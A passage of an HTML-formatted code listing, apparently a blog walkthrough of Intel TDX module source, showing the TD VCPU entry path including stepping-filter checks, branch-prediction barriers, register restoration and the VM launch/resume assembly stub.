class=\"comment\">                                 *  Else, no need to flush, since this LP is guaranteed not to hold any</span></span><br><span class=\"line\"><span class=\"comment\">                                 *  address translation for this VCPU</span></span><br><span class=\"line\"><span class=\"comment\">                                 */</span></span><br><span class=\"line\">                                <span class=\"comment\">// Execute INVEPT type 1 for each Secure EPT</span></span><br><span class=\"line\">                                flush_all_td_asids(tdr_ptr, tdcs_ptr);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                                <span class=\"comment\">// Invalidate all soft-translated GPAs</span></span><br><span class=\"line\">                                invalidate_all_gpa_translations(tdcs_ptr, tdvps_ptr);</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                            <span class=\"comment\">// Store the sampled value of TD_EPOCH as the new value of VCPU_EPOCH</span></span><br><span class=\"line\">                            tdvps_ptr-&gt;management.vcpu_epoch = vcpu_epoch;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to acquire global lock for TD epoch\\n&quot;</span>);</span><br><span class=\"line\">        return_val = api_error_with_operand_id(TDX_OPERAND_BUSY, OPERAND_ID_TD_EPOCH);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    stepping_filter_e filter_result = FILTER_OK_CONTINUE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sample current VMCS state for handling stepping filter FILTER_OK_NOTIFY_EPS_FAULT case</span></span><br><span class=\"line\">    <span class=\"type\">vm_vmexit_exit_reason_t</span> exit_reason;</span><br><span class=\"line\">    <span class=\"type\">vmx_exit_qualification_t</span> exit_qualification;</span><br><span class=\"line\">    <span class=\"type\">pa_t</span> faulting_gpa;</span><br><span class=\"line\"></span><br><span class=\"line\">    ia32_vmread(VMX_VM_EXIT_REASON_ENCODE, &amp;exit_reason.raw);</span><br><span class=\"line\">    ia32_vmread(VMX_VM_EXIT_QUALIFICATION_ENCODE, &amp;exit_qualification.raw);</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_PHYSICAL_ADDRESS_INFO_FULL_ENCODE, &amp;faulting_gpa.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">    IF_RARE ((return_val = handle_stepping_filter(tdr_ptr, tdcs_ptr, tdvps_ptr, exit_reason, &amp;faulting_gpa,</span><br><span class=\"line\">                                                  &amp;is_sept_locked, &amp;filter_result)) != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed handling stepping filter - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.curr_vm != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = handle_l2_entry(tdr_ptr, tdcs_ptr, tdvps_ptr,</span><br><span class=\"line\">                                           &amp;exit_reason, &amp;exit_qualification, &amp;faulting_gpa);</span><br><span class=\"line\"></span><br><span class=\"line\">        IF_RARE (return_val != TDX_SUCCESS)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            TDX_ERROR(<span class=\"string\">&quot;Failed to handle L2 entry\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// If the stepping filter above indicated a #VE injection, inject it now to the L1 VMM</span></span><br><span class=\"line\">    <span class=\"comment\">// being entered, with the values sampled above from the VMCS of the VM that previously exited.</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((filter_result == FILTER_OK_NOTIFY_EPS_FAULT) &amp;&amp; can_inject_epf_ve(exit_qualification, tdvps_ptr))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdx_debug_assert(tdvps_ptr-&gt;management.curr_vm == <span class=\"number\">0</span>);</span><br><span class=\"line\">        tdx_inject_ve((<span class=\"type\">uint32_t</span>)exit_reason.raw, exit_qualification.raw, tdvps_ptr, faulting_gpa.raw, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/*-------------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\">    At this point we&#x27;re at the VM to be entered - if there was an L2-&gt;L1 virtual exit</span></span><br><span class=\"line\"><span class=\"comment\">    then the state of L1 is after the L2-&gt;L1 exit.</span></span><br><span class=\"line\"><span class=\"comment\">    If the stepping filter above indicated too many EPT violations on private GPA,</span></span><br><span class=\"line\"><span class=\"comment\">    emulate an EPT violation TD exit; do not do an actual VM entry so the VM is not</span></span><br><span class=\"line\"><span class=\"comment\">    exposed to the 0-step attack.</span></span><br><span class=\"line\"><span class=\"comment\">    -------------------------------------------------------------------------------------*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (filter_result == FILTER_FAIL_TDENTER_EPFS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdx_debug_assert(is_sept_locked == <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// decrement the TLB tracker that was incremented at the beginning of TDENTER</span></span><br><span class=\"line\">        revert_tlb_tracking_state(tdcs_ptr, tdvps_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">        emulate_ept_violation_td_exit(get_local_data(), faulting_gpa, tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</span><br><span class=\"line\"></span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Too many EPT violation on private GPA - 0x%llx\\n&quot;</span>, faulting_gpa.raw);</span><br><span class=\"line\">        return_val = VMEXIT_REASON_EPT_VIOLATION;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Translate soft-translated GPAs, if required</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((tdvps_ptr-&gt;management.curr_vm != <span class=\"number\">0</span>) &amp;&amp;</span><br><span class=\"line\">        !translate_gpas(tdr_ptr, tdcs_ptr, tdvps_ptr, tdvps_ptr-&gt;management.curr_vm, &amp;faulting_gpa.raw))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// decrement the TLB tracker that was incremented at the beginning of TDENTER</span></span><br><span class=\"line\">        revert_tlb_tracking_state(tdcs_ptr, tdvps_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">        emulate_ept_violation_td_exit(get_local_data(), faulting_gpa, tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;EPT violation due GPA (0x%llx) translation\\n&quot;</span>, faulting_gpa.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">        return_val = VMEXIT_REASON_EPT_VIOLATION;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ALL CHECKS PASSED:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* OP_STATE has been locked in a temporary mode; it is released before</span></span><br><span class=\"line\"><span class=\"comment\">       entering non-root mode. */</span></span><br><span class=\"line\">    tdx_debug_assert(op_state_locked_flag);</span><br><span class=\"line\">    release_sharex_lock_hp_sh(&amp;(tdcs_ptr-&gt;management_fields.op_state_lock));</span><br><span class=\"line\">    op_state_locked_flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If the current VCPU to be executed on this LP is not the same as the last one,</span></span><br><span class=\"line\">    <span class=\"comment\">// issue an indirect branch prediction barrier (IBPB) command</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvpr_pa.raw != local_data_ptr-&gt;vp_ctx.last_tdvpr_pa.raw)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// The TD ASID (Address Space Identifier) does not distinguish between different VCPUs of the same TD.</span></span><br><span class=\"line\">        <span class=\"comment\">// Therefore, when switching VCPU of the same TD on the same LP we should invalidate EPT.</span></span><br><span class=\"line\">        <span class=\"comment\">// Practically, we do this on every VCPU switch (even not of the same TD).</span></span><br><span class=\"line\">        <span class=\"comment\">// This is because it is difficult to track the history of TD execution on an LP</span></span><br><span class=\"line\">        <span class=\"comment\">// (i.e., we should check for every TD/VCPU combination in the past).</span></span><br><span class=\"line\">        flush_all_td_asids(tdr_ptr, tdcs_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Issue an indirect branch prediction barrier (IBPB) command, since the CPU does not</span></span><br><span class=\"line\">        <span class=\"comment\">// distinguish between VCPUs for its branch prediction.</span></span><br><span class=\"line\">        <span class=\"type\">ia32_pred_cmd_t</span> pred_cmd = &#123; .raw = <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">        pred_cmd.ibpb = <span class=\"number\">1</span>;</span><br><span class=\"line\">        ia32_wrmsr(IA32_PRED_CMD_MSR_ADDR, pred_cmd.raw);</span><br><span class=\"line\">        local_data_ptr-&gt;vp_ctx.last_tdvpr_pa.raw = tdvpr_pa.raw;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Save the TDR, TDCS and TDVPS linear pointers for use after every VM exit</span></span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdr               = tdr_ptr;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdr_pamt_entry    = tdr_pamt_entry_ptr;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdr_pa            = tdr_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdvps             = tdvps_ptr;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdvpr_pamt_entry  = tdvpr_pamt_entry_ptr;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdvpr_pamt_block  = tdvpr_pamt_block;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdvpr_pa          = tdvpr_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.tdcs              = tdcs_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Save some other TD state to avoid accessing TDCS and TDVPS in case of a</span></span><br><span class=\"line\">    <span class=\"comment\">// memory integrity error</span></span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.attributes = tdcs_ptr-&gt;executions_ctl_fields.attributes;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.xfam = tdvps_ptr-&gt;management.xfam;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.xfd_supported = tdcs_ptr-&gt;executions_ctl_fields.cpuid_flags.xfd_supported;</span><br><span class=\"line\">    local_data_ptr-&gt;vp_ctx.ia32_perf_global_status = tdvps_ptr-&gt;guest_msr_state.ia32_perf_global_status;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Restore Guest Extended State</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.last_td_exit == LAST_EXIT_TDVMCALL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Last TD exit was a TDGVPVMCALL. GPR and XMM state passed from the host</span></span><br><span class=\"line\">        <span class=\"comment\">// VMM to the guest TD are selected by guest RCX, saved by TDGVPVMCALL.</span></span><br><span class=\"line\">        control.raw = tdvps_ptr-&gt;guest_state.gpr_state.rcx;</span><br><span class=\"line\"></span><br><span class=\"line\">        save_regs_after_tdvmcall(tdvps_ptr, control, tdvps_ptr-&gt;guest_state.gpr_state.gprs);</span><br><span class=\"line\">                <span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">save_regs_after_tdvmcall</span><span class=\"params\">(<span class=\"type\">tdvps_t</span>* tdvps_ptr, <span class=\"type\">tdvmcall_control_t</span> control, </span></span><br><span class=\"line\"><span class=\"params\">                    <span class=\"type\">uint64_t</span> gprs[<span class=\"number\">16</span>])</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"type\">uint64_t</span> mask;</span><br><span class=\"line\">                    <span class=\"type\">uint32_t</span> i;</span><br><span class=\"line\">                </span><br><span class=\"line\">                    <span class=\"comment\">/* Save XMM registers selected by guest RCX to TDVPS.</span></span><br><span class=\"line\"><span class=\"comment\">                     * Later on the whole state of XMMs, MXCSR and optionally YMMs and ZMMs is</span></span><br><span class=\"line\"><span class=\"comment\">                     * restored from TDVPS.</span></span><br><span class=\"line\"><span class=\"comment\">                     */</span></span><br><span class=\"line\">                    save_xmms_by_mask(tdvps_ptr, control.xmm_select);</span><br><span class=\"line\">                                <span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">save_xmms_by_mask</span><span class=\"params\">(<span class=\"type\">tdvps_t</span>* tdvps_ptr, <span class=\"type\">uint16_t</span> xmm_select)</span></span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"type\">uint128_t</span> xmms[<span class=\"number\">16</span>];</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                store_xmms_in_buffer(xmms);</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                <span class=\"comment\">// Copy the required VMM XMM&#x27;s to the guest XMM&#x27;s</span></span><br><span class=\"line\">                                <span class=\"keyword\">for</span> (<span class=\"type\">uint32_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (xmm_select &amp; (<span class=\"type\">uint16_t</span>)BIT(i))</span><br><span class=\"line\">                                    &#123;</span><br><span class=\"line\">                                        tdvps_ptr-&gt;guest_extension_state.xbuf.legacy_region.xmm[i] = xmms[i];</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                basic_memset_to_zero(xmms, <span class=\"keyword\">sizeof</span>(xmms));</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (xmm_select != <span class=\"number\">0</span>)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    tdvps_ptr-&gt;guest_extension_state.xbuf.xsave_header.xstate_bv |= BIT(<span class=\"number\">1</span>);</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            </span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                    <span class=\"comment\">/* Save VMM GPRs selected by guest RCX to TDVPS.</span></span><br><span class=\"line\"><span class=\"comment\">                     * RAX and RCX are not copied, start from RDX.</span></span><br><span class=\"line\"><span class=\"comment\">                     */</span></span><br><span class=\"line\">                    mask = <span class=\"number\">0x0004</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (i = <span class=\"number\">2</span>; i &lt; <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((control.gpr_select &amp; mask) != <span class=\"number\">0</span>)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            gprs[i] = get_local_data()-&gt;vmm_regs.gprs[i];</span><br><span class=\"line\">                        &#125;       </span><br><span class=\"line\">                        mask &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                </span><br><span class=\"line\">                    gprs[<span class=\"number\">0</span>] = TDX_SUCCESS;   <span class=\"comment\">// RAX</span></span><br><span class=\"line\">                    gprs[<span class=\"number\">1</span>] = control.raw;   <span class=\"comment\">// RCX</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.last_td_exit == LAST_EXIT_ASYNC_TRAP)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Following a trap-like TD exit, update the guest&#x27;s TDCALL completion status with</span></span><br><span class=\"line\">        <span class=\"comment\">// the host hint bit.</span></span><br><span class=\"line\">        <span class=\"type\">api_error_code_t</span> guest_tdcall_status;</span><br><span class=\"line\">        guest_tdcall_status.raw = tdvps_ptr-&gt;guest_state.gpr_state.rax;</span><br><span class=\"line\">        guest_tdcall_status.host_recoverability_hint = vcpu_and_flags.host_recoverability_hint;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_state.gpr_state.rax = guest_tdcall_status.raw;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.curr_vm == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">vmx_procbased_ctls_t</span> vm_procbased_ctls;</span><br><span class=\"line\">        <span class=\"comment\">/* If PEND_NMI was requested, and there&#x27;s no pending #VE (which should be handled</span></span><br><span class=\"line\"><span class=\"comment\">           by the guest TD before NMI), set NMI Window Exiting execution control so NMI</span></span><br><span class=\"line\"><span class=\"comment\">           can be injected at the proper time. */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.pend_nmi &amp;&amp; (tdvps_ptr-&gt;ve_info.valid == <span class=\"number\">0</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ia32_vmread(VMX_VM_EXECUTION_CONTROL_PROC_BASED_ENCODE, &amp;vm_procbased_ctls.raw);</span><br><span class=\"line\">            vm_procbased_ctls.nmi_window_exiting = <span class=\"number\">1</span>;</span><br><span class=\"line\">            ia32_vmwrite(VMX_VM_EXECUTION_CONTROL_PROC_BASED_ENCODE, vm_procbased_ctls.raw);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"comment\">// Reentering into L2</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// If NMI unblocking by IRET was indicated during VM exit, re-block NMI</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.nmi_unblocking_due_to_iret)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            set_guest_inter_blocking_by_nmi();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    tdvps_ptr-&gt;management.state = VCPU_ACTIVE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set the guest TD&#x27;s IA32_DEBUGCTL.ENABLE_UNCORE_PMI to the VMM&#x27;s value.</span></span><br><span class=\"line\">    <span class=\"type\">ia32_debugctl_t</span> debugctl;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_IA32_DEBUGCTLMSR_FULL_ENCODE, &amp;debugctl.raw);</span><br><span class=\"line\">    debugctl.en_uncore_pmi = local_data_ptr-&gt;ia32_debugctl_value.en_uncore_pmi;</span><br><span class=\"line\">    ia32_vmwrite(VMX_GUEST_IA32_DEBUGCTLMSR_FULL_ENCODE, debugctl.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.curr_vm != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Set the VMX preemption timer, if TSC deadline is enabled</span></span><br><span class=\"line\">        set_vmx_preemption_timer(tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If the SEPT lock was acquired by the TDENTER stepping filter, release it now</span></span><br><span class=\"line\">    <span class=\"comment\">// SEPT lock will be acquired by TDENTER stepping filter only if it didn&#x27;t return</span></span><br><span class=\"line\">    <span class=\"comment\">// FILTER_FAIL_TDENTER_SEPT_BUSY or FILTER_FAIL_TDENTER_EPFS</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_sept_locked)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        release_sharex_lock_ex(&amp;tdcs_ptr-&gt;executions_ctl_fields.secure_ept_lock);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set VMCS.IA32_SPEC_CTRL_SHADOW to the virtual value of IA32_SPEC_CTRL as seen by the TD</span></span><br><span class=\"line\">    ia32_vmwrite(VMX_IA32_SPEC_CTRL_SHADOW,</span><br><span class=\"line\">            calculate_virt_ia32_spec_ctrl(tdcs_ptr, tdvps_ptr-&gt;guest_msr_state.ia32_spec_ctrl));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Restore other Guest state (GPRs, DRs, MSRs) in TDVPS</span></span><br><span class=\"line\">    restore_guest_td_state_before_td_entry(tdcs_ptr, tdvps_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    update_host_state_in_td_vmcs(local_data_ptr, tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</span><br><span class=\"line\"></span><br><span class=\"line\">    local_data_ptr-&gt;single_step_def_state.last_entry_tsc = ia32_rdtsc();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.vm_launched[tdvps_ptr-&gt;management.curr_vm])</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdx_return_to_td(<span class=\"literal\">true</span>, <span class=\"literal\">true</span>, &amp;tdvps_ptr-&gt;guest_state.gpr_state);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdx_return_to_td(<span class=\"literal\">false</span>, <span class=\"literal\">true</span>, &amp;tdvps_ptr-&gt;guest_state.gpr_state);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Flow should never reach here</span></span><br><span class=\"line\">    tdx_sanity_check(<span class=\"number\">0</span>, SCEC_SEAMCALL_SOURCE(TDH_VP_ENTER_LEAF), <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">EXIT_FAILURE:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_sept_locked)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        release_sharex_lock_ex(&amp;tdcs_ptr-&gt;executions_ctl_fields.secure_ept_lock);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check if we need to load the SEAM VMCS</span></span><br><span class=\"line\">    IF_COMMON (td_vmcs_loaded)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        set_seam_vmcs_as_active();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Release all acquired locks and free keyhole mappings</span></span><br><span class=\"line\">    IF_COMMON (tdcs_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        IF_COMMON (op_state_locked_flag)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            release_sharex_lock_hp_sh(&amp;(tdcs_ptr-&gt;management_fields.op_state_lock));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        free_la(tdcs_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    IF_COMMON (tdr_locked_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        pamt_implicit_release_lock(tdr_pamt_entry_ptr, TDX_LOCK_SHARED);</span><br><span class=\"line\">        free_la(tdr_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    IF_COMMON (tdvpr_locked_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        pamt_unwalk(tdvpr_pa, tdvpr_pamt_block, tdvpr_pamt_entry_ptr, TDX_LOCK_SHARED, PT_4KB);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tdvps_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            free_la(tdvps_ptr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> return_val;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">tdx_return_to_td</span><span class=\"params\">(<span class=\"type\">bool_t</span> launch_state, <span class=\"type\">bool_t</span> called_from_tdenter, <span class=\"type\">gprs_state_t</span>* gpr_state)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// TDX Local data</span></span><br><span class=\"line\">    <span class=\"type\">tdx_module_local_t</span>* local_data_ptr = get_local_data();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Restore IA32_SPEC_CTRL</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!called_from_tdenter)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// TDENTER already loads the spec ctrl with safe checks</span></span><br><span class=\"line\">        wrmsr_opt(IA32_SPEC_CTRL_MSR_ADDR,</span><br><span class=\"line\">                  local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_spec_ctrl, TDX_MODULE_IA32_SPEC_CTRL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check that we have no mapped keyholes left, beside the 2 that we store for TDR/TDVPR PAMT entries</span></span><br><span class=\"line\">    tdx_sanity_check(local_data_ptr-&gt;keyhole_state.total_ref_count == NUM_OF_PRESERVED_KEYHOLES,</span><br><span class=\"line\">                     SCEC_KEYHOLE_MANAGER_SOURCE, <span class=\"number\">30</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    local_data_ptr-&gt;current_td_vm_id = local_data_ptr-&gt;vp_ctx.tdvps-&gt;management.curr_vm;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Exit to TD</span></span><br><span class=\"line\">    tdx_tdentry_to_td(launch_state, gpr_state);<span class=\"comment\">//guest_state.gpr_state</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tdx_tdentry_to_td:</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Restore all TD GPRs on module entry from a TDVPS GPR area ptr passed in RSI</span><br><span class=\"line\">     */</span><br><span class=\"line\">    movq (%rsi),     %rax</span><br><span class=\"line\">    movq 8(%rsi),    %rcx</span><br><span class=\"line\">    movq 16(%rsi),   %rdx</span><br><span class=\"line\">    movq 24(%rsi),   %rbx</span><br><span class=\"line\">    // movq 32(%rsi),   %rsp - keep the RSP of the TDX module for debug purposes.</span><br><span class=\"line\">    // Actual RSP of the TD will be loaded during the VMENTRY from the TDCS (TD VMCS)</span><br><span class=\"line\">    movq 40(%rsi),   %rbp</span><br><span class=\"line\"></span><br><span class=\"line\">    // RSI and RDI will be restored later - we are still using them</span><br><span class=\"line\"></span><br><span class=\"line\">    movq 64(%rsi),   %r8</span><br><span class=\"line\">    movq 72(%rsi),   %r9</span><br><span class=\"line\">    movq 80(%rsi),   %r10</span><br><span class=\"line\">    movq 88(%rsi),   %r11</span><br><span class=\"line\">    movq 96(%rsi),   %r12</span><br><span class=\"line\">    movq 104(%rsi),  %r13</span><br><span class=\"line\">    movq 112(%rsi),  %r14</span><br><span class=\"line\">    movq 120(%rsi),  %r15</span><br><span class=\"line\"></span><br><span class=\"line\">    // Launch state is being passed as a parameter</span><br><span class=\"line\">    test %edi, %edi</span><br><span class=\"line\">    jz vmlaunch_lbl</span><br><span class=\"line\"></span><br><span class=\"line\">    movq 56(%rsi),   %rdi</span><br><span class=\"line\">    movq 48(%rsi),   %rsi</span><br><span class=\"line\"></span><br><span class=\"line\">    vmresume</span><br><span class=\"line\">    </span><br><span class=\"line\">#ifdef DEBUGFEATURE_TDX_DBG_TRACE</span><br><span class=\"line\">    call tdx_failed_vmentry</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">    * Unreachable code.  panic.</span><br><span class=\"line\">    */</span><br><span class=\"line\">    ud2</span><br><span class=\"line\"></span><br><span class=\"line\">vmlaunch_lbl:</span><br><span class=\"line\"></span><br><span class=\"line\">    movq 56(%rsi),   %rdi</span><br><span class=\"line\">    movq 48(%rsi),   %rsi</span><br><span class=\"line\"></span><br><span class=\"line\">    vmlaunch</span><br><span class=\"line\">    </span><br><span class=\"line\">#ifdef DEBUGFEATURE_TDX_DBG_TRACE</span><br><span class=\"line\">    call tdx_failed_vmentry</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 